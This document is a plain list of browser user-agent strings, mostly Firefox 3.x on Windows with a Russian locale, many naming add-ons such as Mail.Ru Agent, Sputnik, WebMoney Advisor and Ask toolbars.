Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.5 (build 02780) Firefox/3.6.11 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03639) Firefox/3.6.12 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 AskTbSTK/3.9.1.14019 Firefox/3.5.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 AskTbSPC2/3.9.1.14019 Firefox/2.0.0.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbFXTV5/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03270) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 ( .NET CLR 3.5.30729) sputnik 2.5.3.31
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03757) Firefox/3.6.10 ( .NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.8) Gecko/2009032711 Ubuntu/8.04 (hardy) Firefox/3.0.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.6 (build 03399) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03638) Firefox/3.6.12 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03399) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 (5D4A6B89-5BBD-D2C1-ECFA-AC5BF5F5E1D5) MRA 5.7 (build 03686) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02790) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 AskTbPTV2/3.9.1.14019 Firefox/3.5.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02812) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV/3.9.1.14019 Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.7 (build 03658) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 AskTbSPC2/3.8.0.12304 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbFXTV5/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.5.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AdCentriaIM/1.7 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) AskTbARS/3.8.0.12304 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Android; Tablet; rv:20.0) Gecko/20.0 Firefox/20.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 MRA 5.6 (build 03278) Firefox/3.6.11 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03686) Firefox/3.6.6 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03755) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 (F10A08C8-206D-F8AC-11A5-EFFD3B19A604) MRA 5.7 (build 03686) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.7 (build 03686) Firefox/3.6.2 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.7 (build 03638) Firefox/3.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03403) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.6 (build 03278) Firefox/3.6.8 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows NT 6.1; rv:2.0b8pre) Gecko/20101108 Firefox/4.0b8pre
Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130418 Firefox/22.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 (F68A0D2C-98E2-FECA-16A8-F64A5D4E02B7) MRA 5.7 (build 03686) Firefox/3.6.12
Mozilla/5.0 (X11; U; FreeBSD i386; ru-RU; rv:1.9.1.2) Gecko/20090903 Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03658) Firefox/3.6.12 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) AskTbPTV/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.3 (build 02552) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbFXTV5/3.9.1.14019 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.3 (build 02564) Firefox/3.6.12
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/9.10 (karmic) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.4 (build 02647) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.5.15
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.10) Gecko/2009042810 ASPLinux/3.0.10-1.0.120asp Firefox/3.0.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03755) Firefox/3.6.12 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03270) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03773) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbFXTV5/3.9.1.14019 Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03392) Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.2.0.34
Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20130526 Firefox/23.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02849) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03686) Firefox/3.6.8 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03773) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.3) Gecko/2008092417 MRA 5.4 (build 02647) Firefox/3.0.3
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) AskTbBT5/3.9.1.14019 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.14) Gecko/20101001 Firefox/3.5.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03385) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) Firefox/3.0.19 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.6 (build 03270) Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV2/3.9.1.14019 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 AdCentriaIM/1.7 Firefox/3.6.10 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03757) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20130416 Firefox/20.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.5 (build 02842) Firefox/3.6.9 ( .NET CLR 3.0.4506.2152) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.6 (build 03278) Firefox/3.0.6 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.4 (build 02652) Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.7 (build 03658) Firefox/3.0.1 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 (5086DBE9-85BB-81C6-E515-9209E4796BD2) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) AskTbCCS/3.9.1.14019 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 BTRS25104 Firefox/3.0.19
Mozilla/5.0 (X11; FreeBSD amd64; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03396) Firefox/3.6.12 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Ant.com Toolbar 2.0.1 Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows NT 5.1; rv:23.0) Gecko/20100101 Firefox/23.0 AlexaToolbar/pNJuBjJf-2.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.7 (build 03686) Firefox/3.5.15
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03658) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.6 (build 03402) AdCentriaIM/1.7 Firefox/3.5.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.4 (build 02603) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 BTRS28621 Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2 ( .NET CLR 3.5.30729) sputnik 2.5.3.58 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.5 (build 02830) Firefox/3.5.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 WebMoney Advisor MRA 5.7 (build 03649);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.4 (build 02652) Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03278) Firefox/3.5.11
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02828) Firefox/3.6.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.13) Gecko/20100914 MRA 5.4 (build 02647) Firefox/3.5.13
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 AdCentriaIM/1.7 Firefox/3.6 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03672) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.5 (build 02842) Firefox/3.6.12 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03790) Firefox/3.6.12 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03402) Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110328 Firefox/4.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 AskTbPTV/3.8.0.12304 Firefox/3.6.6
Mozilla/5.0 (Windows NT 6.1; rv:23.0; WUID=32dcc6056a9431615cbcb19206095651; WTB=6533) Gecko/20100101 Firefox/23.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbTKR/3.9.1.14019 Firefox/3.6.12 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.9) Gecko/20100824 MRA 5.7 (build 03658) Firefox/3.6.9 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03384) Firefox/3.6.12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729) sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.6 (build 03278) Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 Firefox/3.5.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03658) Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.3.1.118 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; eo; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03637) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPCW/3.9.1.14019 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.0.10, Ant.com Toolbar 1.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 YB/5.0.3
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.12 YB/5.0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 MRA 5.7 (build 03686) BTRS26718 Firefox/3.6.12 sputnik 2.3.0.96
